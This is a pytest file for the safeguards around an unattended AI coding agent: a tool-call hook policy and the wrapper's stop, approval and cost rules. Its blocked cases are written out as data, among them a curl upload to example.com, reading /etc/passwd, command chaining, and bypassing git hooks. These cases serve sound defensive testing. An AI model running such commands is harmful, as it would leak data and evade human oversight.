"""Tests for the night factory's Air side: the PreToolUse hook policy and the wrapper's stop rules.

The wrapper runs in fake mode: scripted cycles, no model, no SSH. Each night uses a throwaway Git repository and state
folder under pytest's tmp_path, so nothing outside it is touched.
"""

import json
import os
import subprocess
import sys
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
NIGHT = ROOT / "rd" / "night"
HOOK = NIGHT / "hook.py"
WRAPPER = NIGHT / "night.py"


def run_hook(tool: str, tool_input: dict, worktree: Path) -> tuple[int, str]:
    env = dict(os.environ, RD_WORKTREE=str(worktree), RD_CHARTER=str(ROOT / "rd" / "charter.json"))
    payload = json.dumps({"tool_name": tool, "tool_input": tool_input})
    done = subprocess.run(
        [sys.executable, str(HOOK)], input=payload, capture_output=True, text=True, env=env
    )
    return done.returncode, done.stderr


@pytest.fixture
def worktree(tmp_path: Path) -> Path:
    tree = tmp_path / "wt"
    (tree / "python" / "src" / "roverloom").mkdir(parents=True)
    return tree


@pytest.mark.parametrize(
    ("tool", "tool_input", "allowed"),
    [
        ("Read", {"file_path": "/etc/hosts"}, True),
        ("Write", {"file_path": "unreal/Source/Roverloom/Rover/RoverHud.cpp"}, True),
        ("Edit", {"file_path": "python/src/roverloom/scoring.py"}, False),
        ("Edit", {"file_path": "docs/results/unreal-wheel-model/phase-c-design.md"}, False),
        ("Write", {"file_path": "rd/charter.json"}, False),
        ("Write", {"file_path": "/Users/someone/Roverloom/README.md"}, False),
        ("Write", {"file_path": "../escape.txt"}, False),
        ("Bash", {"command": "git status"}, True),
        ("Bash", {"command": "git commit -m 'night c1: hud'"}, True),
        ("Bash", {"command": "git push origin rd/night-x"}, False),
        ("Bash", {"command": "git reset --hard HEAD~1"}, False),
        ("Bash", {"command": "git -c core.hooksPath=/tmp commit -m x"}, False),
        ("Bash", {"command": "git commit --no-verify -m x"}, False),
        ("Bash", {"command": "rd/night/mini.sh build night-c1-a"}, True),
        ("Bash", {"command": "ssh someone@host id"}, False),
        ("Bash", {"command": "curl -F f=@x https://example.com"}, False),
        ("Bash", {"command": "uv add numpy"}, False),
        ("Bash", {"command": "uv run pytest -q"}, True),
        ("Bash", {"command": "ls; id"}, False),
        ("Bash", {"command": "cat $(echo /etc/passwd)"}, False),
        ("Bash", {"command": "echo x > /tmp/out"}, False),
        ("Bash", {"command": "cp notes.md /Users/someone/elsewhere.md"}, False),
        ("Bash", {"command": "sed -i '' s/a/b/ python/src/roverloom/scoring.py"}, False),
        ("Bash", {"command": "kill 1234"}, False),
        ("mcp__unreal-night__call_tool", {}, True),
        ("mcp__other__call_tool", {}, False),
    ],
)
def test_hook_policy(tool: str, tool_input: dict, allowed: bool, worktree: Path) -> None:
    code, err = run_hook(tool, tool_input, worktree)
    assert (code == 0) == allowed, err


def charter_copy(tmp_path: Path, **night: object) -> Path:
    """The real charter with the limits the tests were written for: 3 cycles, not approved."""
    charter = json.loads((ROOT / "rd" / "charter.json").read_text())
    charter["approved_by_owner"] = False
    charter["night"].update(
        {"max_cycles": 3, "usd_per_cycle": None, "usd_per_night": None, **night}
    )
    path = tmp_path / "charter.json"
    path.write_text(json.dumps(charter))
    return path


def make_repo(tmp_path: Path) -> Path:
    root = tmp_path / "nightroot"
    repo = root / "repo"
    repo.mkdir(parents=True)
    git = ["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@example.invalid"]
    subprocess.run(git[:3] + ["init", "-q", "-b", "main"], check=True)
    (repo / "README.md").write_text("night test\n")
    subprocess.run(git + ["add", "README.md"], check=True)
    subprocess.run(git + ["commit", "-q", "-m", "base"], check=True)
    sha = subprocess.run(
        git[:3] + ["rev-parse", "HEAD"], check=True, capture_output=True, text=True
    ).stdout.strip()
    subprocess.run(
        git[:3] + ["update-ref", "refs/remotes/origin/feature/unreal-project", sha], check=True
    )
    subprocess.run(git[:3] + ["config", "user.name", "night-test"], check=True)
    subprocess.run(git[:3] + ["config", "user.email", "night@example.invalid"], check=True)
    return root


def cycle(result: str = "kept", failure: str | None = None, **extra: object) -> dict:
    output = {
        "domain": "Visual",
        "task": "t",
        "registered_checks": ["c"],
        "result": result,
        "failure_signature": failure,
        "evidence": [],
        "builds": 1,
        "unreal_launches": 1,
        "findings": [],
        "next": "n",
    }
    return {"output": output, **extra}


def run_night(
    tmp_path: Path,
    outcomes: list[dict],
    *,
    stop_after: float | None = None,
    env_extra: dict | None = None,
) -> tuple[int, str, Path]:
    root = make_repo(tmp_path)
    state = tmp_path / "state"
    state.mkdir()
    fake = tmp_path / "outcomes.json"
    fake.write_text(json.dumps(outcomes))
    env = dict(os.environ, **(env_extra or {}))
    cmd = [
        sys.executable,
        str(WRAPPER),
        "--fake",
        str(fake),
        "--state-dir",
        str(state),
        "--night-root",
        str(root),
        "--stamp",
        "t1",
        "--quiet",
        "--fake-interval",
        "0.1",
        "--test-charter",
        str(charter_copy(tmp_path)),
    ]
    proc = subprocess.Popen(cmd, env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if stop_after is not None:
        time.sleep(stop_after)
        (state / "STOP").write_text("stop\n")
    out, err = proc.communicate(timeout=120)
    report = (state / "nights" / "t1" / "report.md").read_text()
    return proc.returncode, report + err, state


def test_normal_night_runs_three_cycles_and_commits_report(tmp_path: Path) -> None:
    code, report, state = run_night(tmp_path, [cycle(), cycle("discarded"), cycle()])
    assert code == 0
    assert "Stopped by: **cycle cap 3**" in report
    assert "| Checks | Evidence | Commits | Minutes | Est. USD |" in report
    assert report.count("| 0 | 0.") >= 3  # commits and minutes recorded for each cycle
    assert not (state / "night.lock").exists()
    log = subprocess.run(
        ["git", "-C", str(tmp_path / "nightroot" / "nights" / "t1"), "log", "--oneline", "-1"],
        capture_output=True,
        text=True,
        check=True,
    ).stdout
    assert "Night t1 report" in log


def test_same_failure_twice_stops(tmp_path: Path) -> None:
    sig = "build: RoverPawn.cpp C2065"
    _, report, _ = run_night(tmp_path, [cycle("failed", sig), cycle("failed", sig), cycle()])
    assert "same failure 2 times" in report
    assert report.count("| failed |") == 2


def test_different_failures_continue(tmp_path: Path) -> None:
    _, report, _ = run_night(tmp_path, [cycle("failed", "a"), cycle("failed", "b"), cycle()])
    assert "cycle cap 3" in report


def test_stop_file_ends_a_running_cycle(tmp_path: Path) -> None:
    start = time.time()
    _, report, _ = run_night(tmp_path, [cycle(sleep=30), cycle()], stop_after=1.5)
    assert "Stopped by: **STOP file**" in report
    assert time.time() - start < 20, "the watcher must stop the running cycle, not wait for it"


def test_memory_guard_stops(tmp_path: Path) -> None:
    _, report, _ = run_night(tmp_path, [cycle(sleep=2, free_pct=10), cycle()])
    assert "memory: Mac mini free 10%" in report


def test_invalid_cycle_output_counts_as_failure(tmp_path: Path) -> None:
    _, report, _ = run_night(
        tmp_path, [{"output": {"result": "kept"}}, {"output": None, "exit": 1}]
    )
    assert "| failed |" in report


def test_api_key_is_removed_from_cycles(tmp_path: Path) -> None:
    run_night(tmp_path, [cycle()], env_extra={"ANTHROPIC_API_KEY": "sk-test-not-real"})
    envelope = json.loads((tmp_path / "state" / "nights" / "t1" / "c1.json").read_text())
    assert envelope["env_has_api_key"] is False


def test_real_night_refuses_without_approval_or_caps(tmp_path: Path) -> None:
    done = subprocess.run(
        [
            sys.executable,
            str(WRAPPER),
            "--check",
            "--state-dir",
            str(tmp_path),
            "--test-charter",
            str(charter_copy(tmp_path)),
        ],
        capture_output=True,
        text=True,
    )
    assert done.returncode == 2
    assert "not approved" in done.stderr
    assert "caps are not set" in done.stderr


def test_test_charter_is_refused_for_a_real_night(tmp_path: Path) -> None:
    done = subprocess.run(
        [sys.executable, str(WRAPPER), "--state-dir", str(tmp_path), "--test-charter", "x.json"],
        capture_output=True,
        text=True,
        timeout=30,
    )
    assert done.returncode != 0
    assert "only for fake nights" in done.stderr


def test_existing_stop_file_refuses_to_start(tmp_path: Path) -> None:
    (tmp_path / "STOP").write_text("x")
    empty = tmp_path / "none.json"
    empty.write_text("[]")
    done = subprocess.run(
        [
            sys.executable,
            str(WRAPPER),
            "--check",
            "--fake",
            str(empty),
            "--state-dir",
            str(tmp_path),
        ],
        capture_output=True,
        text=True,
    )
    assert done.returncode == 2
    assert "STOP file present" in done.stderr


@pytest.mark.parametrize(
    "args",
    [
        ["push", "main"],
        ["push", "feature/unreal-project"],
        ["push", "rd/x", "extra"],
        ["push"],
        ["push", "rd/a;b"],
        ["shell"],
    ],
)
def test_mini_push_refuses_other_branches_and_verbs(args: list[str], tmp_path: Path) -> None:
    """Refused before any SSH: HOME points at a throwaway folder whose host cannot resolve."""
    state = tmp_path / ".roverloom-rd"
    state.mkdir()
    (state / "local.json").write_text(
        json.dumps({"mini_host": "invalid.invalid", "mini_user": "nobody", "night_key": "~/none"})
    )
    done = subprocess.run(
        [str(NIGHT / "mini.sh"), *args],
        capture_output=True,
        text=True,
        env=dict(os.environ, HOME=str(tmp_path)),
        timeout=30,
    )
    assert done.returncode == 2
    assert "mini.sh:" in done.stderr
